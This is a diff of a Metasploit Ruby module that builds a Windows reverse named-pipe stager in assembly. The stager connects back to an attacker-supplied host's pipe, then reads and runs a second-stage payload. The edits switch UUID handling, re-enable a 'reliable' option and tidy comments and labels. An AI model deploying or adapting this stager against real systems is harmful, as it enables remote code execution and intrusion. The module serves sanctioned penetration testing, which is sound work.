@@ -2,7 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
-#require 'msf/core/payload/windows/send_uuid'
+require 'msf/core/payload/windows/write_uuid'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -18,7 +18,7 @@ module Payload::Windows::ReverseNamedPipe
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
-  include Msf::Payload::Windows::SendUUID
+  include Msf::Payload::Windows::WriteUUID
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 
@@ -98,16 +98,13 @@ module Payload::Windows::ReverseNamedPipe
   def asm_reverse_named_pipe(opts={})
 
     retry_count    = [opts[:retry_count].to_i, 1].max
-    #reliable       = opts[:reliable]
-    reliable       = false
+    reliable       = opts[:reliable]
     # we have to double-escape because of metasm
     full_pipe_name = "\\\\\\\\#{opts[:host]}\\\\pipe\\\\#{opts[:name]}"
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
       ; Output: EDI will be the handle for the pipe to the server
-
-        ;int 3
 
       retry_start:
         push #{retry_count}     ; retry counter
@@ -130,7 +127,7 @@ module Payload::Windows::ReverseNamedPipe
         call ebp                ; CreateFileA(...)
 
         ; If eax is -1, then we had a failure.
-        cmp eax, -1             ; zero means a failure
+        cmp eax, -1             ; -1 means a failure
         jnz connected
 
       handle_connect_failure:
@@ -160,7 +157,7 @@ module Payload::Windows::ReverseNamedPipe
     ^
 
     # TODO: add the "write file" equiv of this
-    #asm << asm_send_uuid if include_send_uuid
+    asm << asm_write_uuid if include_send_uuid
 
     asm << %Q^
         ; Receive the size of the incoming second stage...
@@ -222,7 +219,7 @@ module Payload::Windows::ReverseNamedPipe
         jz read_failed
         pop eax                 ; get the number of bytes read
         cmp eax, 0
-        jnz read_succeeded
+        jnz read_successful
 
       read_failed:
         ; something failed, free up memory
